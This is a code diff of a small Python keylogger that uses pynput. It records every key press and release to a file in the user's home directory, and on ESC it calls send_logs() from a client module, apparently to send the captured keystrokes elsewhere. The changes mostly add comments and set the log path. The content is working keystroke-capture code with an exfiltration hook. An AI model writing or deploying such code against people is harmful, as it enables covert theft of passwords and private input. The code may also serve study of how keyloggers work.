@@ -1,11 +1,14 @@
-from pynput import keyboard
+# Import required modules
 import logging
+from pynput import keyboard
 from client import send_logs
 
-log_dir = ""
+# Path to directory for storing keylogs - User home (~) directory
+log_dir = "~/"
 
 logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='["%(asctime)s", %(message)s]')
 
+# Event - A key is pressed
 def on_press(key):
     try:
         logging.info('{0} pressed'.format(
@@ -14,11 +17,13 @@ def on_press(key):
         logging.info('{0} pressed'.format(
             key))
 
+# Event - A key is released
 def on_release(key):
     logging.info('{0} released'.format(
         key))
+    # If ESC key was pressed and released, then
     if key == keyboard.Key.esc:
-        # Stop listener
+        # Stop the listener
         send_logs()
         return False
 
